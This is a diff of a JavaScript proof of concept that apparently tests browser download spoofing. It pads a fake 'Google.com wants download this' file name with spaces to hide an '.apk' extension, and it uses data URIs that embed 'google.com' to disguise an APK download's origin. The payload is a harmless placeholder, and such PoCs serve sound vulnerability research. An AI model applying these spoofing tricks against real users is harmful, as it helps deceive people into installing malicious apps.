@@ -62,7 +62,7 @@
                         const blob = new Blob(['poc_data'], { type: 'application/vnd.android.package-archive' });
                         fileWriter.onwriteend = () => {
                             const fsURL = fileEntry.toURL();
-                            const win = window.open("", "_blank", "width=200,height=200");
+                            const win = window.open("data:http://google.com/application/octet-stream;base64,ZXN0dGVzdHRlc3Q=", "_blank", "width=200,height=200");
                             if (win) {
                                 updateLog("Window opened. Triggering FS download in 2s...");
                                 setTimeout(() => {
@@ -113,7 +113,7 @@
             const fakeName = "Google.com" + " " + "wants" + " " + "download" + " " + "this" + "  ".repeat(40) + "\u002D" + " " + "chrome.apk";            
             setTimeout(() => {
                 const a = document.createElement("a");
-                a.href = "data:/\\\\\\/.google.com/application/vnd.android.package-archive;base64,ZXN0dGVzdHRlc3Q=";
+                a.href = "data:application/vnd.android.package-archive;base64,ZXN0dGVzdHRlc3Q=";
                 a.download = fakeName;
                 a.click();
             }, 1000);
